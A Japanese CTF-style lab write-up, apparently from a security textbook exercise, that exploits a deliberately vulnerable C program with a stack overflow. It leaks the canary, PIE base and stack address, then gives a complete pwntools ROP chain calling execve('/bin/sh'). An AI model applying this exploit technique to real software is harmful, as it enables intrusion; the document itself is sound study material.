問題として与えられているソースコード（chall_stack.c）は以下です。お題としては、「このプログラムで ROP をして、シェルを起動してください」です。コンパイル後のプログラムバイナリ（chall_stack）と、答えのエクスプロイトコード（exploit_stack.py）が提供されています。

あと、コンパイルオプションは `-static-pie` を与えており、静的リンクで、PIE を有効にしています。また、ヒントが与えられていて、「canary、バイナリベースアドレス、スタックアドレスがリーク可能」と、「syscall命令を含む ROP gadget を利用」と書かれています。

ソースコードを見ていきます。ローカル変数の msg という配列が定義され、`{}` では、0 初期化になります。その後は、メインの for文です。for文では、4回ループで、ログ出力→read関数（脆弱性あり）→ログ出力、という内容です。

```c
#include <stdio.h>
#include <unistd.h>

int main(void){
	char msg[0x10] = {};

	setbuf(stdout, NULL);

	puts("You can put message 4 times!");
	for(int i=0; i<4; i++){
		printf("Input (%d/4) >> ", i+1);
		read(STDIN_FILENO, msg, 0x70);
		printf("Output : %s\n", msg);
	}
	puts("Bye!");

	return 0;
}
```

普通にリターンアドレスを書き換えて、ROP を行っていくことになりますが、まず、考えなければならないのは、スタックカナリヤが有効とのことなので、それを回避する必要があります。これは、32.4.1 で行った対応で出来そうです。具体的には、canary の先頭が 0 になっているところを 0 以外の値で埋めて、canary の値をリークし、スタックカナリアを回避するエクスプロイトコードになると思います。これが、for文の 1回目の行動になりそうです。

次に、PIE が有効とのことなので、何らかのアドレスをリークし、その相対アドレスを調べて、ベースアドレスを求めます。それにより、system関数か、execve関数を実行することでシェルを起動できそうです。では、どうやってアドレスをリークするかを考えます。ローカル変数の msg は、0 初期化されているので、32.4.2 で解説されていた、未初期化の変数からアドレスを得るというのは無理ということになります。上の canary のリークで、そのすぐ後ろにある Saved RBP や、リターンアドレスが出力できるかもしれません。これは途中に 0 があるとダメなので、実際にやってみたいと思います。

表層解析です。ん？スタックカナリアが無効のようです。。。何かの不備なんでしょうか。とりあえず、先に進みます。

```sh
$ file ./chall_stack
./chall_stack: ELF 64-bit LSB pie executable, x86-64, version 1 (GNU/Linux), static-pie linked, BuildID[sha1]=b6806fb22df5030de6ee970a55e0128c884b8276, for GNU/Linux 3.2.0, not stripped

$ ~/bin/checksec --file=./chall_stack
RELRO       STACK CANARY     NX          PIE          RPATH     RUNPATH     Symbols       FORTIFY  Fortified  Fortifiable  FILE
Full RELRO  No canary found  NX enabled  PIE enabled  No RPATH  No RUNPATH  1884 Symbols  N/A      0          21           ./chall_stack
```

GDB を起動してみます。

以下に逆アセンブル結果を貼ります。スタックは 48（0x30）byte 確保されていて、スタックカナリアは有効ですね、、、何かおかしい気がしますが、分かりません。msg があり、その後ろは 8byte 空きで、その後に、canary が続いています。canary のリークには、16byte + 8 byte + 1byte = 25byte を埋めれば良さそうです。

```asm
pwndbg> disassemble main
Dump of assembler code for function main:
   0x00007ffff7f3a0c9 <+0>:     endbr64
   0x00007ffff7f3a0cd <+4>:     push   rbp
   0x00007ffff7f3a0ce <+5>:     mov    rbp,rsp
=> 0x00007ffff7f3a0d1 <+8>:     sub    rsp,0x30
   0x00007ffff7f3a0d5 <+12>:    mov    rax,QWORD PTR fs:0x28
   0x00007ffff7f3a0de <+21>:    mov    QWORD PTR [rbp-0x8],rax
   0x00007ffff7f3a0e2 <+25>:    xor    eax,eax
   0x00007ffff7f3a0e4 <+27>:    mov    QWORD PTR [rbp-0x20],0x0
   0x00007ffff7f3a0ec <+35>:    mov    QWORD PTR [rbp-0x18],0x0
   0x00007ffff7f3a0f4 <+43>:    mov    rax,QWORD PTR [rip+0xc14f5]        # 0x7ffff7ffb5f0 <stdout>
   0x00007ffff7f3a0fb <+50>:    mov    esi,0x0
   0x00007ffff7f3a100 <+55>:    mov    rdi,rax
   0x00007ffff7f3a103 <+58>:    call   0x7ffff7f52df0 <setbuf>
   0x00007ffff7f3a108 <+63>:    lea    rdi,[rip+0x93ef5]        # 0x7ffff7fce004
   0x00007ffff7f3a10f <+70>:    call   0x7ffff7f50ce0 <puts>
   0x00007ffff7f3a114 <+75>:    mov    DWORD PTR [rbp-0x24],0x0
   0x00007ffff7f3a11b <+82>:    jmp    0x7ffff7f3a168 <main+159>
   0x00007ffff7f3a11d <+84>:    mov    eax,DWORD PTR [rbp-0x24]
   0x00007ffff7f3a120 <+87>:    add    eax,0x1
   0x00007ffff7f3a123 <+90>:    mov    esi,eax
   0x00007ffff7f3a125 <+92>:    lea    rdi,[rip+0x93ef5]        # 0x7ffff7fce021
   0x00007ffff7f3a12c <+99>:    mov    eax,0x0
   0x00007ffff7f3a131 <+104>:   call   0x7ffff7f49020 <printf>
   0x00007ffff7f3a136 <+109>:   lea    rax,[rbp-0x20]
   0x00007ffff7f3a13a <+113>:   mov    edx,0x70
   0x00007ffff7f3a13f <+118>:   mov    rsi,rax
   0x00007ffff7f3a142 <+121>:   mov    edi,0x0
   0x00007ffff7f3a147 <+126>:   call   0x7ffff7f88f80 <read>
   0x00007ffff7f3a14c <+131>:   lea    rax,[rbp-0x20]
   0x00007ffff7f3a150 <+135>:   mov    rsi,rax
   0x00007ffff7f3a153 <+138>:   lea    rdi,[rip+0x93ed8]        # 0x7ffff7fce032
   0x00007ffff7f3a15a <+145>:   mov    eax,0x0
   0x00007ffff7f3a15f <+150>:   call   0x7ffff7f49020 <printf>
   0x00007ffff7f3a164 <+155>:   add    DWORD PTR [rbp-0x24],0x1
   0x00007ffff7f3a168 <+159>:   cmp    DWORD PTR [rbp-0x24],0x3
   0x00007ffff7f3a16c <+163>:   jle    0x7ffff7f3a11d <main+84>
   0x00007ffff7f3a16e <+165>:   lea    rdi,[rip+0x93eca]        # 0x7ffff7fce03f
   0x00007ffff7f3a175 <+172>:   call   0x7ffff7f50ce0 <puts>
   0x00007ffff7f3a17a <+177>:   mov    eax,0x0
   0x00007ffff7f3a17f <+182>:   mov    rcx,QWORD PTR [rbp-0x8]
   0x00007ffff7f3a183 <+186>:   xor    rcx,QWORD PTR fs:0x28
   0x00007ffff7f3a18c <+195>:   je     0x7ffff7f3a193 <main+202>
   0x00007ffff7f3a18e <+197>:   call   0x7ffff7f8c8c0 <__stack_chk_fail_local>
   0x00007ffff7f3a193 <+202>:   leave
   0x00007ffff7f3a194 <+203>:   ret
End of assembler dump.
```

スタックを表にまとめます。

| アドレス | サイズ | 内容 |
| - | - | - |
| rbp |
| rbp - 0x08 | 8 | canary |
| rbp - 0x10 | 8 | 空き |
| rbp - 0x20 | 16 | msg |
| rbp - 0x24 | 4 | ループカウンタ（i） |
| rbp - 0x30 | 12 | 空き（rsp） |

スタック確保後の状態の GDB です。`[ STACK ]` を見ると、msg の後の 8byte の空き領域は、0 のようです。Saved RBP には、`__libc_csu_init` のアドレスが入っています。これをリークすることにより、ベースアドレスが求まりそうです。

```sh
$ gdb -q ./chall_stack
Poetry could not find a pyproject.toml file in /home/user/svn/experiment/shokai_security_contest/files/pwnable/99_challs/stack or its parents
pwndbg: loaded 169 pwndbg commands and 47 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $base, $bn_sym, $bn_var, $bn_eval, $ida GDB functions (can be used with print/break)
Reading symbols from ./chall_stack...
(No debugging symbols found in ./chall_stack)
------- tip of the day (disable with set show-tips off) -------
Need to mmap or mprotect memory in the debugee? Use commands with the same name to inject and run such syscalls

pwndbg> start
Temporary breakpoint 1 at 0xa0d1

Temporary breakpoint 1, 0x00007ffff7f3a0d1 in main ()
（省略）
pwndbg> si
0x00007ffff7f3a0d5 in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq[ REGISTERS / show-flags off / show-compact-regs off ]qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
 RAX  0x7ffff7f3a0c9 (main) ?? endbr64
 RBX  0
 RCX  4
 RDX  0x7fffffffe218 ?? 0x7fffffffe4fa ?? 'SHELL=/bin/bash'
 RDI  1
 RSI  0x7fffffffe208 ?? 0x7fffffffe49e ?? '/home/user/svn/experiment/shokai_security_contest/files/pwnable/99_challs/stack/chall_stack'
 R8   0
 R9   4
 R10  0
 R11  1
 R12  0x7ffff7f3b220 (__libc_csu_fini) ?? endbr64
 R13  0
 R14  0
 R15  0
 RBP  0x7fffffffe0d0 ?? 0x7ffff7f3b180 (__libc_csu_init) ?? endbr64
*RSP  0x7fffffffe0a0 ?? 0x7fffffffe208 ?? 0x7fffffffe49e ?? '/home/user/svn/experiment/shokai_security_contest/files/pwnable/99_challs/stack/chall_stack'
*RIP  0x7ffff7f3a0d5 (main+12) ?? mov rax, qword ptr fs:[0x28]
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq[ DISASM / x86-64 / set emulate on ]qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
   0x7ffff7f3a0d1 <main+8>     sub    rsp, 0x30                          RSP => 0x7fffffffe0a0 (0x7fffffffe0d0 - 0x30)
 ? 0x7ffff7f3a0d5 <main+12>    mov    rax, qword ptr fs:[0x28]           RAX, [0x7ffff7fff8a8] => 0x4a2a08b019274e00
   0x7ffff7f3a0de <main+21>    mov    qword ptr [rbp - 8], rax           [0x7fffffffe0c8] <= 0x4a2a08b019274e00
   0x7ffff7f3a0e2 <main+25>    xor    eax, eax                           EAX => 0
   0x7ffff7f3a0e4 <main+27>    mov    qword ptr [rbp - 0x20], 0          [0x7fffffffe0b0] <= 0
   0x7ffff7f3a0ec <main+35>    mov    qword ptr [rbp - 0x18], 0          [0x7fffffffe0b8] <= 0
   0x7ffff7f3a0f4 <main+43>    mov    rax, qword ptr [rip + 0xc14f5]     RAX, [stdout] => 0x7ffff7ffb240 (_IO_2_1_stdout_) ?? 0xfbad2084
   0x7ffff7f3a0fb <main+50>    mov    esi, 0                             ESI => 0
   0x7ffff7f3a100 <main+55>    mov    rdi, rax                           RDI => 0x7ffff7ffb240 (_IO_2_1_stdout_) ?? 0xfbad2084
   0x7ffff7f3a103 <main+58>    call   setbuf                      <setbuf>

   0x7ffff7f3a108 <main+63>    lea    rdi, [rip + 0x93ef5]     RDI => 0x7ffff7fce004 ?? 'You can put message 4 times!'
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq[ STACK ]qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
00:0000x rsp 0x7fffffffe0a0 ?? 0x7fffffffe208 ?? 0x7fffffffe49e ?? '/home/user/svn/experiment/shokai_security_contest/files/pwnable/99_challs/stack/chall_stack'
01:0008x-028 0x7fffffffe0a8 ?? 0
02:0010x-020 0x7fffffffe0b0 ?? 0x7ffff7f3b180 (__libc_csu_init) ?? endbr64
03:0018x-018 0x7fffffffe0b8 ?? 0x7ffff7f3b220 (__libc_csu_fini) ?? endbr64
04:0020x-010 0x7fffffffe0c0 ?? 0
05:0028x-008 0x7fffffffe0c8 ?? 0
06:0030x rbp 0x7fffffffe0d0 ?? 0x7ffff7f3b180 (__libc_csu_init) ?? endbr64
07:0038x+008 0x7fffffffe0d8 ?? 0x7ffff7f3a9b0 (__libc_start_main+1168) ?? mov edi, eax
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq[ BACKTRACE ]qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
 ? 0   0x7ffff7f3a0d5 main+12
   1   0x7ffff7f3a9b0 __libc_start_main+1168
   2   0x7ffff7f3a00e _start+46
```

簡単に、canary の先頭の 0 に別の値を埋めるのをやってみます。

最初は、16byte を書いてみます。read関数は NULL文字を設定しないので、空きの 8byte のデータも一緒に出力されることが期待されますが、上で見たように、そこは 0 になっていたので、何も読めません。

次に、25byte を書いてみます。`a` の後に、`5d 20 20 84 08 3f 60 80 41 53 0d 76 7f` という値が出力されています。最初の 7byte は canary で、あとの 6byte は、Saved RBP なので、`__libc_csu_init` のアドレス（0x7f760d534180）だと思われます。

```sh
$ python -c 'print("a" * 16, end="")' | ./chall_stack
You can put message 4 times!
Input (1/4) >> Output : aaaaaaaaaaaaaaaa
Input (2/4) >> Output : aaaaaaaaaaaaaaaa
Input (3/4) >> Output : aaaaaaaaaaaaaaaa
Input (4/4) >> Output : aaaaaaaaaaaaaaaa
Bye!

$ python -c 'print("a" * 16, end="")' | ./chall_stack | hexdump -C
00000000  59 6f 75 20 63 61 6e 20  70 75 74 20 6d 65 73 73  |You can put mess|
00000010  61 67 65 20 34 20 74 69  6d 65 73 21 0a 49 6e 70  |age 4 times!.Inp|
00000020  75 74 20 28 31 2f 34 29  20 3e 3e 20 4f 75 74 70  |ut (1/4) >> Outp|
00000030  75 74 20 3a 20 61 61 61  61 61 61 61 61 61 61 61  |ut : aaaaaaaaaaa|
00000040  61 61 61 61 61 0a 49 6e  70 75 74 20 28 32 2f 34  |aaaaa.Input (2/4|
00000050  29 20 3e 3e 20 4f 75 74  70 75 74 20 3a 20 61 61  |) >> Output : aa|
00000060  61 61 61 61 61 61 61 61  61 61 61 61 61 61 0a 49  |aaaaaaaaaaaaaa.I|
00000070  6e 70 75 74 20 28 33 2f  34 29 20 3e 3e 20 4f 75  |nput (3/4) >> Ou|
00000080  74 70 75 74 20 3a 20 61  61 61 61 61 61 61 61 61  |tput : aaaaaaaaa|
00000090  61 61 61 61 61 61 61 0a  49 6e 70 75 74 20 28 34  |aaaaaaa.Input (4|
000000a0  2f 34 29 20 3e 3e 20 4f  75 74 70 75 74 20 3a 20  |/4) >> Output : |
000000b0  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  |aaaaaaaaaaaaaaaa|
000000c0  0a 42 79 65 21 0a                                 |.Bye!.|
000000c6

$ python -c 'print("a" * 25, end="")' | ./chall_stack
You can put message 4 times!
Input (1/4) >> Output : aaaaaaaaaaaaaaaaaaaaaaaaa?;??C?b?A?{?
Input (2/4) >> Output : aaaaaaaaaaaaaaaaaaaaaaaaa?;??C?b?A?{?
Input (3/4) >> Output : aaaaaaaaaaaaaaaaaaaaaaaaa?;??C?b?A?{?
Input (4/4) >> Output : aaaaaaaaaaaaaaaaaaaaaaaaa?;??C?b?A?{?
Bye!
*** stack smashing detected ***: terminated
中止

$ python -c 'print("a" * 25, end="")' | ./chall_stack | hexdump -C
00000000  59 6f 75 20 63 61 6e 20  70 75 74 20 6d 65 73 73  |You can put mess|
00000010  61 67 65 20 34 20 74 69  6d 65 73 21 0a 49 6e 70  |age 4 times!.Inp|
00000020  75 74 20 28 31 2f 34 29  20 3e 3e 20 4f 75 74 70  |ut (1/4) >> Outp|
00000030  75 74 20 3a 20 61 61 61  61 61 61 61 61 61 61 61  |ut : aaaaaaaaaaa|
00000040  61 61 61 61 61 61 61 61  61 61 61 61 61 61 5d 20  |aaaaaaaaaaaaaa] |
00000050  20 84 08 3f 60 80 41 53  0d 76 7f 0a 49 6e 70 75  | ..?`.AS.v..Inpu|
*** stack smashing detected ***: terminated
00000060  74 20 28 32 2f 34 29 20  3e 3e 20 4f 75 74 70 75  |t (2/4) >> Outpu|
00000070  74 20 3a 20 61 61 61 61  61 61 61 61 61 61 61 61  |t : aaaaaaaaaaaa|
00000080  61 61 61 61 61 61 61 61  61 61 61 61 61 5d 20 20  |aaaaaaaaaaaaa]  |
00000090  84 08 3f 60 80 41 53 0d  76 7f 0a 49 6e 70 75 74  |..?`.AS.v..Input|
000000a0  20 28 33 2f 34 29 20 3e  3e 20 4f 75 74 70 75 74  | (3/4) >> Output|
000000b0  20 3a 20 61 61 61 61 61  61 61 61 61 61 61 61 61  | : aaaaaaaaaaaaa|
000000c0  61 61 61 61 61 61 61 61  61 61 61 61 5d 20 20 84  |aaaaaaaaaaaa]  .|
000000d0  08 3f 60 80 41 53 0d 76  7f 0a 49 6e 70 75 74 20  |.?`.AS.v..Input |
000000e0  28 34 2f 34 29 20 3e 3e  20 4f 75 74 70 75 74 20  |(4/4) >> Output |
000000f0  3a 20 61 61 61 61 61 61  61 61 61 61 61 61 61 61  |: aaaaaaaaaaaaaa|
00000100  61 61 61 61 61 61 61 61  61 61 61 5d 20 20 84 08  |aaaaaaaaaaa]  ..|
00000110  3f 60 80 41 53 0d 76 7f  0a 42 79 65 21 0a        |?`.AS.v..Bye!.|
0000011e
```

`__libc_csu_init` のアドレスを調べます。これは相対アドレスなので、先ほど調べたアドレスから引くと、`0x7f760d534180 - 0xb180 = 0x7F760D529000` になり、これがベースアドレスになります。書籍にも解説がありましたが、ベースアドレスはページ境界（4KB境界）になるので、下位12bit が 0 になりますので、合ってそうです。

```sh
$ nm chall_stack | grep __libc_csu_init
000000000000b180 T __libc_csu_init
```

次に、`/bin/sh`、system関数、execve関数を探します。静的リンクなので、libc を含んでいるので、あるはずです。しかし、どれも見つかりません。使ってない関数は含まれないということかもしれません。

```sh
$ strings -tx chall_stack | grep '/bin/sh'

$ nm chall_stack | grep system
00000000000b3cc0 r system_dirs
00000000000b3ca0 r system_dirs_len

$ nm chall_stack | grep execve
```

仕方ないので別の手を考えます。ヒントに、スタックアドレスがリーク可能とあるので、スタックバッファオーバーフローで、`/bin/sh` を書いておいて（例えば、msg と canary の間の空き 8byte に書いておく）、そのアドレスを引数にすることが出来るかもしれません。スタックに、スタックアドレスが書かれているかを調べます。pwndbg には、tele というコマンドがあり、スタックをいい感じに表示してくれます。

msg は rsp + 0x10 からなので、それ以降で探すと、、、rsp + 0x50 にスタックのアドレスらしいものが入っています。

```sh
pwndbg> tele rsp 20
00:0000x rsp     0x7fffffffe0a0 ?? 0x7fffffffe208 ?? 0x7fffffffe49e ?? '/home/user/svn/experiment/shokai_security_contest/files/pwnable/99_challs/stack/chall_stack'
01:0008x-028     0x7fffffffe0a8 ?? 0
... ↓            3 skipped
05:0028x-008     0x7fffffffe0c8 ?? 0x7e770be78c5fa000
06:0030x rbp     0x7fffffffe0d0 ?? 0x7ffff7f3b180 (__libc_csu_init) ?? endbr64
07:0038x+008     0x7fffffffe0d8 ?? 0x7ffff7f3a9b0 (__libc_start_main+1168) ?? mov edi, eax
08:0040x+010     0x7fffffffe0e0 ?? 0
09:0048x+018     0x7fffffffe0e8 ?? 0x100000000
0a:0050x+020     0x7fffffffe0f0 ?? 0x7fffffffe208 ?? 0x7fffffffe49e ?? '/home/user/svn/experiment/shokai_security_contest/files/pwnable/99_challs/stack/chall_stack'
0b:0058x+028     0x7fffffffe0f8 ?? 0x7ffff7f3a0c9 (main) ?? endbr64
0c:0060x+030     0x7fffffffe100 ?? 0
0d:0068x+038     0x7fffffffe108 ?? 0x600000000
0e:0070x+040     0x7fffffffe110 ?? 0xc0000008e
0f:0078x+048     0x7fffffffe118 ?? 0x80
10:0080x+050     0x7fffffffe120 ?? 0
... ↓            3 skipped
```

念のため、メモリマップを確認しておきます。ちゃんとスタックのアドレスでした。msg と canary の間の空き 8byte に、"/bin/sh" を書いておくとすると、得られるスタックのアドレスが 0x7fffffffe208 で、書き込みたいスタックのアドレスは 0x7fffffffe0c0 なので、その差は、0x148 です。

```sh
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
    0x7ffff7f2a000     0x7ffff7f2e000 r--p     4000      0 [vvar]
    0x7ffff7f2e000     0x7ffff7f30000 r-xp     2000      0 [vdso]
    0x7ffff7f30000     0x7ffff7f39000 r--p     9000      0 /home/user/svn/experiment/shokai_security_contest/files/pwnable/99_challs/stack/chall_stack
    0x7ffff7f39000     0x7ffff7fce000 r-xp    95000   9000 /home/user/svn/experiment/shokai_security_contest/files/pwnable/99_challs/stack/chall_stack
    0x7ffff7fce000     0x7ffff7ff7000 r--p    29000  9e000 /home/user/svn/experiment/shokai_security_contest/files/pwnable/99_challs/stack/chall_stack
    0x7ffff7ff7000     0x7ffff7ffb000 r--p     4000  c6000 /home/user/svn/experiment/shokai_security_contest/files/pwnable/99_challs/stack/chall_stack
    0x7ffff7ffb000     0x7ffff7ffe000 rw-p     3000  ca000 /home/user/svn/experiment/shokai_security_contest/files/pwnable/99_challs/stack/chall_stack
    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000      0 [heap]
    0x7ffff7fff000     0x7ffff8022000 rw-p    23000      0 [heap]
    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]
```

次に、ヒントに、syscall命令を ROP Gadget で利用できるとあるので、探して見ます。syscall命令は、たくさん見つかりました。execve のシステムコールを使うので、pop rax、pop rdi、pop rsi、pop rdx も探しておきます。全部見つかりました。

```sh
$ rp-lin -f ./chall_stack -r 1 | grep 'syscall'
（省略）
0x262a4: syscall ; ret ; (1 found)
（省略）

$ rp-lin -f ./chall_stack -r 1 | grep 'pop rax'
（省略）
0x59a27: pop rax ; ret ; (1 found)
（省略）

$ rp-lin -f ./chall_stack -r 1 | grep 'pop rdi'
（省略）
0x9c3a: pop rdi ; ret ; (1 found)
（省略）

$ rp-lin -f ./chall_stack -r 1 | grep 'pop rsi'
0x177ce: pop rsi ; ret ; (1 found)
（省略）

$ rp-lin -f ./chall_stack -r 1 | grep 'pop rdx'
0x9b3f: pop rdx ; ret ; (1 found)
```

これで、必要な情報は揃ったので、あとは、エクスプロイトコードを実装していきます。以下になりました。

```python
from pwn import *

context( os='linux', arch='amd64' )

#prog = "../shokai_security_contest/files/pwnable/99_challs/stack/chall_stack"
prog = "./chall_stack"

elf  = ELF( prog )
poprax  = 0x59a27
poprdi  = 0x9c3a
poprsi  = 0x177ce
poprdx  = 0x9b3f
syscall = 0x262a4

proc = process( prog )
#proc = gdb.debug( prog )

# canaryのリーク
proc.sendafter( '>> ', b'a' * 0x18 + b'!' )
proc.recvuntil( 'a!' )
canary = u64( b'\x00' + proc.recv(7) )
info( f"canary = 0x{canary:08X}" )

# プログラムバイナリのベースアドレスを求める
# (Saved RBP に格納されている __libc_csu_init から求める)
proc.sendafter( '>> ', b'a' * 0x1F + b'!' )
proc.recvuntil( 'a!' )
adrs = u64( proc.recv(6) + b'\x00\x00' )
base = adrs - 0xb180
info( f"adrs = 0x{adrs:08X}, base=0x{base:08X}" )

# スタックアドレスのリーク
proc.sendafter( '>> ', b'a' * 0x3F + b'!' )
proc.recvuntil( 'a!' )
adrs = u64( proc.recv(6) + b'\x00\x00' )
stack = adrs - 0x148
info( f"adrs = 0x{adrs:08X}, stack=0x{stack:08X}" )

ropchain  = b'a' * 0x10
ropchain += p64( 0x68732f6e69622f ) # "/bin/sh"
ropchain += p64( canary )
ropchain += p64( 0xdeadbeef )
ropchain += p64( base + poprax ) 
ropchain += p64( 0x3b )          # execve
ropchain += p64( base + poprdi ) 
ropchain += p64( stack )         # "/bin/sh"の格納先
ropchain += p64( base + poprsi ) 
ropchain += p64( 0x00 )          # execveの第2引数
ropchain += p64( base + poprdx ) 
ropchain += p64( 0x00 )          # execveの第3引数
ropchain += p64( base + syscall ) 

# シェルを取る
proc.sendafter( '>> ', ropchain )

proc.interactive()
```

実行してみます。最初はうまくいきませんでしたが、デバッグして、いくつか修正したところ、うまくシェルを取ることが出来ました！

```sh
$ python tmp.py
[*] '/home/user/svn/experiment/shokai_security_contest/files/pwnable/99_challs/stack/chall_stack'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Starting local process './chall_stack': pid 394953
/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py:831: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
/home/user/svn/experiment/shokai_security_contest/files/pwnable/99_challs/stack/tmp.py:20: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  proc.recvuntil( 'a!' )
[*] canary = 0x48B9A93A6DAF2700
/home/user/svn/experiment/shokai_security_contest/files/pwnable/99_challs/stack/tmp.py:27: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  proc.recvuntil( 'a!' )
[*] adrs = 0x7F288F9AB180, base=0x7F288F9A0000
/home/user/svn/experiment/shokai_security_contest/files/pwnable/99_challs/stack/tmp.py:34: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  proc.recvuntil( 'a!' )
[*] adrs = 0x7FFEDDC23E28, stack=0x7FFEDDC23CE0
[*] Switching to interactive mode
Output : aaaaaaaaaaaaaaaa/bin/sh
Bye!
$ ls
chall_stack  chall_stack.c  core  exploit_stack.py  tmp.py
```

